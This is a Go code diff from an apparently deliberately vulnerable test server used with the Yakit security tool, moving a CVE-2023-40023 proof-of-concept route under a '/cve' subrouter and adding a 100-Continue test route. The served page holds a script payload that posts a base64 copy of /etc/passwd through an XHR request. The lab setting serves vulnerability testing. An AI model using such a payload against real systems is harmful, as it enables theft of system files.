@@ -8,7 +8,9 @@ import (
 )
 
 func (s *VulinServer) registerMiscRoute() {
-	s.router.HandleFunc("/CVE-2023-40023", func(writer http.ResponseWriter, request *http.Request) {
+	router := s.router
+
+	handle := func(writer http.ResponseWriter, request *http.Request) {
 		writer.Header().Set("Content-Type", "text/html; charset=utf-8")
 		writer.Write([]byte(`<script>
   const xhr = new XMLHttpRequest();
@@ -16,7 +18,14 @@ func (s *VulinServer) registerMiscRoute() {
   xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   xhr.send("file={{base64enc(file(/etc/passwd))}}");
 </script>`))
+	}
+	r := router.PathPrefix("/cve").Name("yakit cve poc 环境").Subrouter()
+	addRouteWithVulInfo(r, &VulInfo{
+		Path:    `/CVE-2023-40023`,
+		Title:   "CVE-2023-40023",
+		Handler: handle,
 	})
+	s.router.HandleFunc("/CVE-2023-40023", handle)
 	s.registerMiscResponse()
 }
 
@@ -24,6 +33,9 @@ func (s *VulinServer) registerMiscResponse() {
 	var router = s.router
 
 	r := router.PathPrefix("/misc/response").Name("一些精心构造的畸形/异常/测试响应").Subrouter()
+	addRouteWithVulInfo(r, &VulInfo{
+		Handler: expect100handle, Title: "100-Continue", Path: "/expect100",
+	})
 	addRouteWithVulInfo(r, &VulInfo{
 		Handler: func(writer http.ResponseWriter, request *http.Request) {
 			defer func() {
